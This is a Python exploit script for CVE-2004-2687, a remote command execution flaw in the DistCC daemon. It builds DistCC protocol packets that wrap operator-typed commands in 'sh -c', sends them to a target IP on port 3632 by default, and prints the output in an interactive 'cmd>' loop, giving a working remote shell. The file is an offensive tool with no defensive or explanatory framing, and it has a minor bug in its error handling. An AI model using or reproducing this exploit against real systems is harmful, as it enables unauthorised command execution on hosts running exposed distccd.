#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import socket
import random
import string
import signal

# https://github.com/distcc/distcc/issues/155

# Ctrl + C supporting
def event_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    exit(1)

def rand_text_alphanumeric(length: int):
	text = ""
	for i in range(length):
		text += random.choice(string.ascii_letters + string.digits)
	return text

def read_std(sock):
    # ignore
    sock.recv(4)
            
    buff_len = int(sock.recv(8), 16)
    if buff_len:
        return sock.recv(buff_len).decode("utf-8")


def exploit(ip: str, port: int):
    start = False
    restart = True
    while restart:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))

            if not start:
                print("\n[+] Connection successful!")
                print("[+] Try to execute command\n")
                start = True
            
            cmd = input("cmd> ")

            if cmd == "exit":
                restart = False
                print("\n\n[!] Exiting...\n")

            args = ["sh", "-c", cmd, "#", "-c", "main.c", "-o", "main.o"]
            payload = "DIST00000001" + "ARGC%.8x" % len(args)

            for arg in args:
                payload += "ARGV%.8x%s" % (len(arg), arg)

            s.send(str.encode(payload))

            dtag = "DOTI0000000A" + rand_text_alphanumeric(10)

            s.send(str.encode(dtag))

            s.recv(24)

            # receive STDERR
            buff = read_std(s)
            if buff:
                print(buff)
            
            # receiver STDOUT
            buff = read_std(s)
            if buff:
                print(buff)

        except socket.timeout:
            print("\n[!] Socket timeout\n")
            break
        except socket.error:
            print("\n[!] Socket error\n")
            break
        except Exception:
            print("\n[!] Exception raised\n")
            break
        finally:
            s.close()

def main():
    header = 'CVE-2004-2687 EXPLOIT'
    usage='python3 exploit.py --ip <ip> --port <port>'
    description='DistCC Daemon - Command Execution (CVE-2004-2687) remote shell exploit'

    parser = argparse.ArgumentParser(prog=header, usage=usage, description=description)
	
    parser.add_argument("--ip", type=str, help='Target IP/HOST', required=True)
    parser.add_argument("--port", default=3632, type=int, help='DistCC listening port, default: 3632', required=False)

    try:
        signal.signal(signal.SIGINT, event_handler)
        args = parser.parse_args()
        exploit(args.ip, args.port)
    except IOError:
        parse.error

if __name__ == '__main__':
    main()
